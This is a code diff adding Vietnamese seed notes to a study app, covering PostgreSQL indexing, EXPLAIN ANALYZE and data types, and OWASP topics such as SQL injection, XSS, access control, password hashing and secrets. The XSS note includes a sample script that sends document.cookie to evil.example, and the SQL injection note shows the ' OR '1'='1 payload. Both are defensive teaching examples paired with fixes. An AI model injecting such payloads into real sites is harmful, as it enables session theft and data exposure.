@@ -726,4 +726,334 @@ ROLLBACK; -- balance cua id = 1 tro lai ban dau, cau UPDATE thu hai chua tung ch
     createdAt: NOW,
     updatedAt: NOW,
   },
+  {
+    id: 'note-index-va-khi-nao-nen-danh',
+    topicId: 'topic-postgresql',
+    title: 'Index và khi nào nên đánh',
+    slug: 'index-va-khi-nao-nen-danh',
+    summary: 'Index tăng tốc đọc nhưng làm chậm ghi — cách chọn cột đáng đánh index.',
+    content: `Truy vấn tìm user theo email chạy nhanh lúc bảng còn vài nghìn dòng, nhưng chậm dần theo thời gian tới khi bảng có vài triệu dòng — dù không có gì trong code ứng dụng thay đổi. Database đang phải quét toàn bộ bảng cho mỗi lần tìm.
+
+## Index tăng tốc đọc thế nào
+
+\`\`\`sql
+CREATE INDEX idx_users_email ON users (email);
+\`\`\`
+
+Không có index, tìm theo \`email\` là quét tuần tự cả bảng — chi phí tăng tuyến tính theo số dòng. Có index (mặc định là B-tree), Postgres tìm theo kiểu chia đôi, chi phí gần như không đổi dù bảng có 10 nghìn hay 10 triệu dòng.
+
+## Cái giá phải trả: ghi chậm hơn
+
+Mỗi \`INSERT\`, \`UPDATE\`, \`DELETE\` trên bảng phải cập nhật lại toàn bộ index liên quan, không chỉ ghi dữ liệu. Bảng càng nhiều index, ghi càng chậm và càng tốn dung lượng đĩa.
+
+## Chọn cột đáng đánh index
+
+- Cột xuất hiện trong \`WHERE\`, \`JOIN\`, \`ORDER BY\` thường xuyên.
+- Cột có độ chọn lọc cao — nhiều giá trị phân biệt. Index trên cột \`boolean\` (chỉ 2 giá trị) gần như vô dụng.
+
+\`\`\`sql
+-- Kiểm tra Postgres có thật sự dùng index không
+EXPLAIN SELECT * FROM users WHERE email = 'a@b.com';
+\`\`\`
+
+## Ghi nhớ
+
+- Index tăng tốc \`SELECT\` nhưng làm chậm \`INSERT\`/\`UPDATE\`/\`DELETE\`.
+- Đánh index cho cột trong \`WHERE\`/\`JOIN\`/\`ORDER BY\` có độ chọn lọc cao.
+- Đừng đánh index "phòng khi cần" — mỗi index thừa là chi phí ghi thật, không phải lý thuyết.`,
+    tags: ['postgresql', 'index', 'hieu-nang'],
+    starred: true,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
+  {
+    id: 'note-doc-explain-analyze',
+    topicId: 'topic-postgresql',
+    title: 'Đọc EXPLAIN ANALYZE',
+    slug: 'doc-explain-analyze',
+    summary: 'Cách đọc kế hoạch thực thi để biết truy vấn chậm ở bước nào.',
+    content: `Một API chậm hẳn so với tuần trước, nghi ngờ là do câu truy vấn nhưng nhìn vào SQL không thấy gì sai — cần biết chính xác bước nào trong kế hoạch thực thi đang ngốn thời gian, thay vì đoán mò.
+
+## Chạy EXPLAIN ANALYZE
+
+\`\`\`sql
+EXPLAIN ANALYZE
+SELECT u.name, COUNT(o.id)
+FROM users u
+LEFT JOIN orders o ON o.user_id = u.id
+GROUP BY u.id;
+\`\`\`
+
+Khác \`EXPLAIN\` thường (chỉ ước tính), \`EXPLAIN ANALYZE\` thực sự chạy câu lệnh và đo thời gian từng bước.
+
+## Đọc các con số quan trọng
+
+- \`Seq Scan\` (quét tuần tự) hay \`Index Scan\` (dùng index) trên mỗi bảng.
+- \`actual time=x..y rows=n loops=m\`: thời gian thực tế, số dòng, số lần lặp của bước đó.
+- \`cost=start..total\`: chi phí ước tính của planner, chỉ để so sánh tương đối giữa các phương án.
+
+## Dấu hiệu cần chú ý
+
+- \`Seq Scan\` trên bảng lớn kèm điều kiện lọc chọn lọc cao thường có nghĩa là thiếu index.
+- Số \`rows\` ước tính lệch xa số dòng thực tế nghĩa là thống kê của planner đã cũ:
+
+\`\`\`sql
+ANALYZE users;
+\`\`\`
+
+## Ghi nhớ
+
+- \`EXPLAIN\` cho kế hoạch dự kiến; \`EXPLAIN ANALYZE\` chạy thật và đo thời gian từng bước.
+- \`Seq Scan\` không phải lúc nào cũng xấu — trên bảng nhỏ nó thường nhanh hơn \`Index Scan\`.
+- Ước tính \`rows\` lệch xa thực tế là dấu hiệu cần chạy lại \`ANALYZE\` trên bảng đó.`,
+    tags: ['postgresql', 'explain', 'hieu-nang'],
+    starred: false,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
+  {
+    id: 'note-kieu-du-lieu-nen-dung',
+    topicId: 'topic-postgresql',
+    title: 'Kiểu dữ liệu nên dùng',
+    slug: 'kieu-du-lieu-nen-dung',
+    summary: 'text, timestamptz, numeric, jsonb — chọn đúng kiểu ngay từ đầu đỡ phải migrate.',
+    content: `Một bảng dùng \`varchar(255)\` cho mọi cột chữ, \`float\` cho giá tiền, \`timestamp\` không kèm múi giờ cho ngày tạo. Vài tháng sau hệ thống mở rộng ra nhiều múi giờ, và một khách hàng report số tiền lệch vài xu do sai số làm tròn — cả hai lỗi đều xuất phát từ việc chọn sai kiểu dữ liệu ngay từ đầu.
+
+## Chọn đúng kiểu ngay từ đầu
+
+\`\`\`sql
+CREATE TABLE products (
+  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+  name text NOT NULL,
+  price numeric(12, 2) NOT NULL,
+  created_at timestamptz NOT NULL DEFAULT now(),
+  metadata jsonb NOT NULL DEFAULT '{}'
+);
+\`\`\`
+
+- \`text\` thay cho \`varchar(n)\`: Postgres không có lợi thế hiệu năng nào khi giới hạn độ dài, chỉ nên giới hạn khi nghiệp vụ thật sự yêu cầu.
+- \`numeric\` cho tiền tệ: chính xác tuyệt đối, không có sai số làm tròn như số thực dấu phẩy động.
+- \`timestamptz\` cho mọi mốc thời gian: Postgres luôn lưu quy về UTC, tự quy đổi ra múi giờ của client khi đọc.
+- \`jsonb\` cho dữ liệu nửa cấu trúc: vẫn truy vấn và đánh index được, không như lưu chuỗi JSON thô trong \`text\`.
+
+## Vì sao không dùng số thực cho tiền
+
+\`\`\`sql
+SELECT 0.1::float8 + 0.2::float8; -- 0.30000000000000004, sai lệch do biểu diễn nhị phân
+SELECT 0.1::numeric + 0.2::numeric; -- 0.3, chính xác tuyệt đối
+\`\`\`
+
+## Ghi nhớ
+
+- \`text\` thay cho \`varchar(n)\` trừ khi nghiệp vụ thật sự cần giới hạn độ dài ở tầng database.
+- \`numeric\` cho mọi giá trị tiền tệ, không bao giờ dùng \`float\`/\`double\`.
+- \`timestamptz\` cho thời gian, \`jsonb\` cho dữ liệu nửa cấu trúc cần truy vấn được.`,
+    tags: ['postgresql', 'kieu-du-lieu'],
+    starred: false,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
+  {
+    id: 'note-sql-injection',
+    topicId: 'topic-owasp',
+    title: 'SQL Injection',
+    slug: 'sql-injection',
+    summary: 'Vì sao nối chuỗi vào câu SQL là lỗ hổng, và prepared statement chặn nó thế nào.',
+    content: `Trang tìm kiếm nhận input người dùng rồi nối thẳng vào câu SQL. Người dùng gõ \`' OR '1'='1\` vào ô tên thay vì một cái tên bình thường, và toàn bộ bảng \`users\` hiện ra thay vì chỉ đúng người họ gõ.
+
+## Vì sao nối chuỗi là lỗ hổng
+
+\`\`\`ts
+// NGUY HIỂM: nối chuỗi input trực tiếp vào câu lệnh
+const name = "' OR '1'='1"
+const query = \`SELECT * FROM users WHERE name = '\${name}'\`
+// Câu lệnh thực tế gửi tới database:
+// SELECT * FROM users WHERE name = '' OR '1'='1'  -> đúng với MỌI hàng
+\`\`\`
+
+Database không phân biệt được đâu là cú pháp câu lệnh, đâu là dữ liệu người dùng gõ — vì cả hai đã bị trộn chung vào một chuỗi.
+
+## Prepared statement: tách dữ liệu khỏi câu lệnh
+
+\`\`\`ts
+import { Pool } from 'pg'
+
+const pool = new Pool()
+const name = "' OR '1'='1"
+const result = await pool.query('SELECT * FROM users WHERE name = $1', [name])
+// $1 luôn được database hiểu là DỮ LIỆU, không thể biến thành cú pháp SQL
+\`\`\`
+
+Câu lệnh (\`'SELECT * FROM users WHERE name = $1'\`) và dữ liệu (\`[name]\`) được gửi tách rời tới database; driver không bao giờ ghép chúng thành một chuỗi trước khi gửi.
+
+## Ghi nhớ
+
+- Không bao giờ nối chuỗi input người dùng trực tiếp vào câu SQL.
+- Prepared statement (\`$1\`, \`$2\`...) gửi câu lệnh và dữ liệu tách rời, dữ liệu không thể đổi cấu trúc câu lệnh.
+- ORM hiện đại dùng prepared statement bên dưới, nhưng raw query string tự nối tay vẫn nguy hiểm dù project có dùng ORM.`,
+    tags: ['owasp', 'sql-injection'],
+    starred: true,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
+  {
+    id: 'note-xss-cross-site-scripting',
+    topicId: 'topic-owasp',
+    title: 'XSS — Cross-Site Scripting',
+    slug: 'xss-cross-site-scripting',
+    summary: 'Ba dạng XSS và nguyên tắc escape theo ngữ cảnh xuất dữ liệu.',
+    content: `Ô bình luận trên một trang cho phép nhập text tự do. Một người dùng gõ \`<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>\` thay vì bình luận bình thường, và từ đó, mọi người mở lại trang đều tự động chạy đoạn script đánh cắp cookie của chính họ.
+
+## Ba dạng XSS
+
+- **Stored**: script được lưu trong database (như ví dụ trên), chạy với mọi người xem lại trang sau này.
+- **Reflected**: script nằm ngay trong URL, chỉ chạy khi nạn nhân bấm vào đúng link độc hại đó.
+- **DOM-based**: không qua server — JavaScript phía client tự ghép dữ liệu không an toàn (như \`location.hash\`) thẳng vào DOM.
+
+## Nguyên tắc: escape theo ngữ cảnh xuất dữ liệu
+
+\`\`\`tsx
+// An toàn: React tự escape khi render text thường
+function Comment({ text }: { text: string }) {
+  return <p>{text}</p> // "<script>" hiển thị như chữ, trình duyệt không chạy nó
+}
+
+// Nguy hiểm: bỏ qua cơ chế escape của framework
+function CommentRaw({ html }: { html: string }) {
+  return <p dangerouslySetInnerHTML={{ __html: html }} /> // script bên trong sẽ thực sự chạy
+}
+\`\`\`
+
+## Ghi nhớ
+
+- Escape đúng ngữ cảnh: text trong HTML, thuộc tính HTML, URL và JavaScript mỗi loại cần cách escape riêng.
+- Framework hiện đại (React, Vue) tự escape khi render text bình thường; chỉ mất an toàn khi chủ động dùng API "raw HTML".
+- Bắt buộc render HTML do người dùng nhập thì phải lọc qua thư viện sanitize (như DOMPurify), không tự viết regex để lọc thẻ.`,
+    tags: ['owasp', 'xss'],
+    starred: false,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
+  {
+    id: 'note-loi-kiem-soat-truy-cap',
+    topicId: 'topic-owasp',
+    title: 'Lỗi kiểm soát truy cập',
+    slug: 'loi-kiem-soat-truy-cap',
+    summary: 'Kiểm tra quyền ở server cho từng bản ghi, không tin vào việc ẩn nút trên giao diện.',
+    content: `Giao diện chỉ hiện nút "Xoá" cho admin, người dùng thường không thấy nút đó nên coi như đã "khoá" tính năng. Nhưng ai đó mở DevTools, sao chép request, rồi gọi thẳng \`DELETE /api/notes/123\` bằng \`curl\` — và ghi chú của người khác bị xoá, vì phía server không hề kiểm tra lại quyền.
+
+## Kiểm tra quyền phải nằm ở server
+
+\`\`\`ts
+export async function DELETE(req: Request, { params }: { params: { id: string } }) {
+  const session = await getSession(req)
+  if (!session) return new Response('Unauthorized', { status: 401 })
+
+  const note = await notesRepo.findById(params.id)
+  if (!note || note.ownerId !== session.userId) {
+    return new Response('Forbidden', { status: 403 })
+  }
+
+  await notesRepo.remove(params.id)
+  return new Response(null, { status: 204 })
+}
+\`\`\`
+
+Ẩn nút trên giao diện chỉ ngăn người dùng bình thường bấm nhầm; nó không ngăn ai đó gọi thẳng API.
+
+## Kiểm tra theo từng bản ghi, không chỉ theo vai trò
+
+Nhiều hệ thống chỉ kiểm tra "đã đăng nhập" hoặc \`role === 'admin'\` rồi coi như đủ. Nhưng một user thường vẫn cần sửa được ghi chú *của chính họ* — route đó phải so khớp \`note.ownerId\` với người đang đăng nhập cho từng request, không phải chỉ kiểm tra một lần ở tầng vai trò chung.
+
+## Ghi nhớ
+
+- Ẩn nút trên giao diện là UX, không phải bảo mật — mọi endpoint phải tự kiểm tra quyền phía server.
+- Kiểm tra theo từng bản ghi (record-level), không chỉ theo vai trò chung chung.
+- Mặc định từ chối: chỉ cho phép sau khi đã xác nhận đúng chủ sở hữu hoặc quyền cụ thể.`,
+    tags: ['owasp', 'phan-quyen'],
+    starred: false,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
+  {
+    id: 'note-luu-mat-khau-dung-cach',
+    topicId: 'topic-owasp',
+    title: 'Lưu mật khẩu đúng cách',
+    slug: 'luu-mat-khau-dung-cach',
+    summary: 'Vì sao phải hash chậm có salt, và vì sao đừng tự nghĩ ra thuật toán.',
+    content: `Database bị rò rỉ. Vì mật khẩu được lưu bằng MD5 không salt, kẻ tấn công tra ngược qua rainbow table có sẵn trên mạng và có lại mật khẩu gốc của hàng loạt tài khoản chỉ trong vài giây — MD5 vốn được thiết kế để chạy cực nhanh, đúng thứ không nên có khi hash mật khẩu.
+
+## Hash chậm có salt, không phải hash nhanh
+
+\`\`\`ts
+import bcrypt from 'bcrypt'
+
+const matKhau = 'hunter2'
+const hash = await bcrypt.hash(matKhau, 12) // 12: cost factor, càng cao càng chậm và càng khó brute-force
+const isValid = await bcrypt.compare(matKhau, hash) // true
+const isSaiMatKhau = await bcrypt.compare('sai-mat-khau', hash) // false
+\`\`\`
+
+\`bcrypt\` tự sinh salt ngẫu nhiên cho từng lần hash và cố tình chạy chậm — GPU không thể thử hàng tỷ khả năng mỗi giây như với MD5/SHA1 trần.
+
+## Đừng tự nghĩ ra thuật toán
+
+Tự chế cách "làm rối" mật khẩu (đảo chuỗi, XOR, hash tay nhiều lớp...) hầu như luôn yếu hơn thuật toán đã được cộng đồng bảo mật kiểm chứng qua nhiều năm, vì thiếu kinh nghiệm đối phó với các kiểu tấn công đã biết.
+
+## Ghi nhớ
+
+- Không bao giờ lưu mật khẩu dạng plain text hay hash nhanh trần (MD5, SHA1, SHA256 không salt).
+- Dùng \`bcrypt\` hoặc \`argon2\` — hash chậm, tự sinh salt ngẫu nhiên riêng cho từng mật khẩu.
+- Cost factor cao hơn thì an toàn hơn nhưng chậm hơn — chọn mức vẫn chấp nhận được cho thời gian đăng nhập.`,
+    tags: ['owasp', 'mat-khau', 'hashing'],
+    starred: false,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
+  {
+    id: 'note-quan-ly-secret-va-bien-moi-truong',
+    topicId: 'topic-owasp',
+    title: 'Quản lý secret và biến môi trường',
+    slug: 'quan-ly-secret-va-bien-moi-truong',
+    summary: 'Không commit secret, phân biệt biến chỉ ở server với biến lộ ra client.',
+    content: `Khoá API của dịch vụ thanh toán bị commit thẳng vào code, đẩy lên một repository công khai trên GitHub. Chỉ vài phút sau, bot tự động quét repository công khai đã tìm ra khoá đó và bắt đầu dùng thử.
+
+## Không commit secret vào git
+
+\`\`\`bash
+# .env (không commit — thêm vào .gitignore)
+DATABASE_URL=postgres://user:pass@localhost:5432/db
+STRIPE_SECRET_KEY=sk_live_xxx
+\`\`\`
+
+\`\`\`bash
+# .gitignore
+.env
+.env.local
+\`\`\`
+
+Secret nên nằm trong biến môi trường (hoặc secret manager của nền tảng deploy), không bao giờ nằm trong file được commit.
+
+## Server-only và biến lộ ra client
+
+\`\`\`ts
+// Chỉ đọc được ở server: route handler, Server Component, Server Action
+const secretKey = process.env.STRIPE_SECRET_KEY
+
+// Biến NEXT_PUBLIC_* được đóng gói thẳng vào bundle JS gửi cho trình duyệt
+const publicKey = process.env.NEXT_PUBLIC_STRIPE_KEY
+\`\`\`
+
+Ở Next.js, bất kỳ biến nào đặt tên bắt đầu bằng \`NEXT_PUBLIC_\` đều bị nhúng vào mã nguồn phía client — ai mở DevTools cũng đọc được, nên tuyệt đối không đặt secret thật dưới tên đó.
+
+## Ghi nhớ
+
+- Secret không bao giờ nằm trong code hay bị commit vào git — dùng biến môi trường hoặc secret manager.
+- Ở Next.js, chỉ biến bắt đầu bằng \`NEXT_PUBLIC_\` mới lộ ra trình duyệt; secret thật phải đặt tên khác.
+- Nếu secret lỡ bị commit, phải xoay vòng (rotate) khoá mới ngay — xoá khỏi lịch sử git không đủ, khoá cũ coi như đã lộ vĩnh viễn.`,
+    tags: ['owasp', 'secret'],
+    starred: false,
+    createdAt: NOW,
+    updatedAt: NOW,
+  },
 ]
